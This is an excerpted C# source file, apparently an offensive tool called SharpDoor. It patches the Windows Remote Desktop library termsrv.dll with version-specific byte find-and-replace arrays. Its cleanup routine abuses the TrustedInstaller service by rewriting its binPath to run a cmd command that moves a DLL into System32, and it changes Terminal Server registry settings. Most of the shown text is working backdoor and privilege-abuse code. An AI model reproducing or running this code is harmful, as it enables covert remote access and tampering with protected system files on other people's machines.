...
namespace SharpDoor
{
    public class Program
    {
        ...
        public static byte[] PatchReplace = {
            0xB8, 0x00, 0x01, 0x00, 0x00, 0x89, 0x81,
            0x38, 0x06, 0x00, 0x00, 0x90
        };
        ...
        static void Main(string[] args)
        {
            ...
            {
                Console.WriteLine("Invalid argument. Use -c for cleanup.");
                System.Environment.Exit(0);
            }
        }
        ...
        static void CleanUp()
        {
            try
            {
                ...
                Console.WriteLine(@"[*] Restore original termsrv.dll from C:\Users\Public\termsrv.dll");

                executeCommand("sc config TrustedInstaller binPath= \"cmd /c move C:\\Users\\Public\\termsrv.dll C:\\Windows\\System32\\termsrv.dll\"");
                executeCommand("sc start \"TrustedInstaller\"");
                Thread.Sleep(2000);
                ...
                Console.WriteLine("[*] Setting Registry Terminal Server\\TSAppAllowList\\fDisabledAllowList to 0");
                RegistryKey reg_key2 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList");
                reg_key2.SetValue("fDisabledAllowList", 0, RegistryValueKind.DWord);
        ...
        private static void TermsrvPatchVersion(string termsrvVersion)
        {
            ...
            {
                PatchFind = new byte[] {
                    0x8B, 0x99, 0x3C, 0x06, 0x00, 0x00, 0x8B, 0xB9,
                    0x38, 0x06, 0x00, 0x00
                };
            }
            ...
            else if (termsrvVersion == "10.0.19041.1")
            {
                PatchFind = new byte[] {
                    0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84,
                    0xA7, 0x3A, 0x01, 0x00
